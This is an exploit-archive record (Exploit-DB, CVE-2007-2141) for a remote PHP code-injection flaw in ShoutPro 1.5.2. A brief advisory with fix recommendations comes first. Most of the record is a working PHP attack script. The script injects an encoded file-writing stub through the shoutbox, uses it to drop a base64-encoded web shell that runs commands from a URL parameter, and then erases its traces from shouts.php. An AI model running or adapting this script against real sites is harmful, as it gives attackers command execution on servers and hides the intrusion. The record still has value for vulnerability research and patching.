{
  "id": "3758",
  "title": "ShoutPro 1.5.2 - &#039;shout.php&#039; Remote Code Injection",
  "cve": "CVE-2007-2141",
  "vuln_type": "unknown",
  "code": "<?/*\r\nFile: shoutbox.php\r\nAffects: ShoutPro 1.5.2 (may affect earlier versions)\r\nDate: 17th April 2007\r\n\r\nIssue Description:\r\n===========================================================================\r\nShoutPro 1.5.2 fails to fully sanitize user input ($shout) that it writes\r\nto the shouts.php file when adding a new message, this can result in the\r\ninjection and execution of arbitrary php code.\r\n===========================================================================\r\n\r\nScope:\r\n===========================================================================\r\nThe vulnerability will in most cases allow an attacker to execute commands\r\non the system, the issue may be further perpetuated if the user has followed\r\nthe official documentation and chmoded the base folder to '777'\r\n===========================================================================\r\n\r\nRecommendation:\r\n===========================================================================\r\n1) Add code to perform strip_tags() on $shout in shoutbox.php\r\n2) Prevent direct access to shouts.php with a .htaccess file\r\n===========================================================================\r\n\r\nDiscovered By: Gammarays\r\n*/?>\r\n\r\n\r\n<?php\r\n\r\necho \"########################################################\\n\";\r\necho \"#   Special Greetings To - Timq,Warpboy,The-Maggot     #\\n\";\r\necho \"########################################################\\n\\n\\n\";\r\n\r\n//Writes Files - Under 100 bytes to meet requirements\r\n$temppayload = \"%3C%3F%24a%3Dfopen%28%24_POST%5B%27f%27%5D%2C%27w%27%29%3Bfwrite%28%24a%2Cbase64_decode%28%24_POST%5B%27d%27%5D%29%29%3Bfclose%28%24a%29%3B%3F%3E\";\r\n\r\n//Execute Commands + Performs Cleanup\r\n$payload = \"PD9waHAgCgppZihpc3NldCgkX0dFVFsnY21kJ10pKQp7CmVjaG8gc2hlbGxfZXhlYyh1cmxkZWNv\".\r\n          \"ZGUoJF9HRVRbJ2NtZCddKSk7CmRpZSgpOwp9CgppZigkX1BPU1RbJ2NsZWFuJ109PSdkb2l0Jykg\".\r\n          \"Y2xlYW4oKTsKCmZ1bmN0aW9uIGNsZWFuKCkKewogICRsMSA9IGZpbGUoJ3Nob3V0cy5waHAnKTsK\".\r\n          \"ICAkZmggPSBmb3Blbignc2hvdXRzLnBocCcsJ3cnKTsKICBpZighJGZoKSBkaWUoKTsKCiAgZm9y\".\r\n          \"ZWFjaCAoJGwxIGFzICRsMikgCiAgewoJaWYoIXN0cnN0cigkbDIsIiRhPWZvcGVuIikpCgl7CgkJ\".\r\n          \"ZnByaW50ZigkZmgsJGwyKTsKCX0gICAgCiAgfQogIGZjbG9zZSgkZmgpOwp9Cgo/Pg==\";\r\n\r\n\r\n\r\nif($argc!=2) die(\"Usage: <url> \\n\\tEx: http://www.example.com/shoutpro/\\n\");\r\n\r\n$url = $argv[1];\r\n//$url = \"http://localhost/ShoutPro1.5.2/\";\r\n\r\n$ch = curl_init($url . \"shoutbox.php\");\r\nif(!$ch) die(\"Error Initializing CURL\");\r\n\r\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Connecting To Target - Is URL Valid?\");\r\n\r\necho \"[ ] Deploying Temp Payload...\\n\";\r\n\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"shoutbox.php?action=post\");\r\ncurl_setopt($ch, CURLOPT_POST,1);\r\ncurl_setopt($ch,\r\nCURLOPT_POSTFIELDS,\"name=Beethoven&pass=&shout=\".$temppayload.\"&post=Post\");\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Deploying Temp Payload\");\r\n\r\necho \"[ ] Deploying Main Payload...\\n\";\r\n\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"shouts.php\");\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"f=module.php&d=\".$payload);\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error Deploying Main Payload\");\r\n\r\necho \"[ ] Attempting Clean Up...\\n\";\r\n\r\ncurl_setopt($ch, CURLOPT_URL,$url . \"module.php\");\r\ncurl_setopt($ch, CURLOPT_POSTFIELDS,\"clean=doit\");\r\n$res = curl_exec($ch);\r\nif(!$res) die(\"Error - Clean Up Failed\");\r\n\r\necho \"[ ] Clean Up Complete\\n\";\r\necho \"[ ] Shell Accessible at \".$url.\"module.php?cmd=<yourcommand>\";\r\n\r\ncurl_close($ch);\r\n?>\r\n\r\n# milw0rm.com [2007-04-17]",
  "url": "https://www.exploit-db.com/exploits/3758"
}